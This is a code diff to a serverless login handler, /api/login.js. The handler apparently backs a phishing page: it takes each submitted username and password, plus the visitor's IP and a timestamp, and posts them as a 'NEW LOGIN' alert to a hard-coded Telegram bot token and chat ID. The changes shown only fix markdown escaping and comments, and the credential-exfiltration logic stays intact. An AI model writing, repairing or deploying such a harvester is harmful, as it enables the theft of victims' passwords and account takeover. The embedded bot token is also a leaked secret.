@@ -1,10 +1,11 @@
-// File: /api/login.js (Final Version with Markdown Escape Fix)
+// File: /api/login.js (Final, Cleaned, and Corrected Version)
 
-const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY'; // Your NEW token is correct.
-const TELEGRAM_CHAT_ID = '6402487270'; // Your Chat ID is correct.
+const TELEGRAM_BOT_TOKEN = '8233346929:AAHRpX-fz0n3LOsCLbsCEGGEQFDF7xulTyY';
+const TELEGRAM_CHAT_ID = '6402487270';
 
-// This function will automatically escape any special Markdown characters.
+// This function escapes special characters for Telegram's MarkdownV2.
 const escapeMarkdown = (text) => {
+  if (typeof text !== 'string') return '';
   const toEscape = /[_*[\]()~`>#+-=|{}.!]/g;
   return text.replace(toEscape, '\\$&');
 };
@@ -14,21 +15,21 @@ export default async function handler(req, res) {
     const { username, password } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
 
-    // Escape each variable individually before putting it in the message.
+    // Escape each variable to prevent injection or formatting errors.
     const safeUsername = escapeMarkdown(username);
     const safePassword = escapeMarkdown(password);
     const safeIp = escapeMarkdown(ip);
     const safeTimestamp = escapeMarkdown(new Date().toISOString());
 
-    // We no longer need to escape the template itself, only the variables.
+    // Correctly formatted message with double-escaped dashes.
     const message = `
 🚨 *NEW LOGIN* 🚨
-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
 👤 *Username:* \`${safeUsername}\`
 🔑 *Password:* \`${safePassword}\`
 💻 *IP Address:* \`${safeIp}\`
 ⏰ *Timestamp:* \`${safeTimestamp}\`
-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-
+\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
     `;
 
     const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
